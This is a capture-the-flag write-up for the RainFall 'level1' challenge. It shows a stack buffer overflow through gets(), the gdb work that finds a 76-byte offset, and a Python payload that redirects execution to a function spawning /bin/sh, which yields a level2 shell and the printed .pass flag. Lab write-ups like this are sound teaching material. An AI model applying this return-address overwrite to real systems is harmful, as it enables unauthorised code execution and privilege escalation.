# level1

We can first see that the [NX-bit](https://en.wikipedia.org/wiki/NX_bit) is disabled, compared to the previous level.

The program take no parameters but wait for input once launched. It prints the string passed in input and segfault with a large string :

```bash
level2@RainFall:~$ ./level2 
qwerty
qwerty
level2@RainFall:~$ ./level2 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Segmentation fault (core dumped)
```

By looking at the functions, we can see that a function `run` is not called, and contains a call of `system` with string `/bin/sh` as parameter.

```gdb
(gdb) info functions
All defined functions:

Non-debugging symbols:
...
0x08048444  run
0x08048480  main
...

(gdb) disas run
Dump of assembler code for function run:
    ...
   0x08048472 <+46>:	mov    DWORD PTR [esp],0x8048584
   0x08048479 <+53>:	call   0x8048360 <system@plt>
   ...
End of assembler dump.

(gdb) x/s 0x8048584
0x8048584:  "/bin/sh"
```

By looking at the assembly code, we can see that the main function only calls `gets`, a function known to be [vulnerable to buffer overflow](https://faq.cprogramming.com/cgi-bin/smartfaq.cgi?answer=1049157810&id=1043284351).

To find the buffer length, we run the program with `gdb` with a breakpoint after the `gets` call.

```gdb
(gdb) disas main
...
   0x08048490 <+16>:	call   0x8048340 <gets@plt>
   0x08048495 <+21>:	leave
   0x08048496 <+22>:	ret
End of assembler dump.
(gdb) b *main+21
Breakpoint 1 at 0x8048495
```

We run the program and watch the stack after the execution of the function :

```bash
(gdb) r
Starting program: /home/user/level1/level1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Breakpoint 1, 0x08048495 in main ()
(gdb) x/24wx $esp
0xbffff6b0:     0xbffff6c0      0x0000002f      0xbffff70c      0xb7fd0ff4
0xbffff6c0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6d0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6e0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff6f0:     0x41414141      0x41414141      0x41414141      0x41414141
0xbffff700:     0x41414141      0x41414141      0x41414141      0x41414141
(gdb) i f
Stack level 0, frame at 0xbffff710:
eip = 0x8048495 in main; saved eip 0x41414141
Arglist at 0xbffff708, args: 
Locals at 0xbffff708, Previous frame's sp is 0xbffff710
Saved registers:
ebp at 0xbffff708, eip at 0xbffff70c
```

We can see that the value of `$eip` is `0x41414141` at the address `0xbffff70c`. We can also see that the buffer begin at the address `0xbffff6c0`. We can now calculate the length we need to fill before overriding the `$eip` address :

```bash
(gdb) p/d 0xbffff70c - 0xbffff6c0
$5 = 76
```

We can test the value of `$eip` with a custom input :

```bash
Starting program: /home/user/level1/level1 
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABBBB

Breakpoint 1, 0x08048495 in main ()
(gdb) i f
Stack level 0, frame at 0xbffff710:
 eip = 0x8048495 in main; saved eip 0x42424242
 Arglist at 0xbffff708, args: 
 Locals at 0xbffff708, Previous frame's sp is 0xbffff710
 Saved registers:
  ebp at 0xbffff708, eip at 0xbffff70c
```

We need to replace the `BBBB` by the address of the `run` function that is `0x08048444`. We need to pipe the malicious string into the program because otherwise it will interpret it as ASCII value.

We save the malicious string in a file so we can execute it with `gdb` :

```bash
level1@RainFall:~$ python -c "print 'A' * 76 + '\x08\x04\x84\x44'" > /tmp/exploit1
...
(gdb) r < /tmp/exploit1
Starting program: /home/user/level1/level1 < /tmp/exploit1

Breakpoint 1, 0x08048495 in main ()
(gdb) i f
Stack level 0, frame at 0xbffff710:
 eip = 0x8048495 in main; saved eip 0x44840408
 Arglist at 0xbffff708, args: 
 Locals at 0xbffff708, Previous frame's sp is 0xbffff710
 Saved registers:
  ebp at 0xbffff708, eip at 0xbffff70c
```

We can see that the saved `eip` inversed, due to the indianess. We invert the malicious string and we are now in the `run` function, but the program end without having a shell :

```bash
level1@RainFall:~$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/exploit1 
level1@RainFall:~$ ./level1 < /tmp/exploit1
Good... Wait what?
Segmentation fault (core dumped)
```

With `cat` command, we will main `stdin` open after the `/bin/sh` is executed. We can see that we are now `level2` user and we can read the password file :

```bash
level1@RainFall:~$ (cat /tmp/exploit1;cat) | ./level1 
Good... Wait what?
whoami
level2
cat /home/user/level2/.pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```

Get the flag :

```bash
level1@RainFall:~$ python -c "print 'A' * 76 + '\x44\x84\x04\x08'" > /tmp/exploi1
level1@RainFall:~$ (cat /tmp/exploit1;cat) | ./level1
Good... Wait what?
$ whoami
level2
$ cd ../level2
$ cat .pass
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
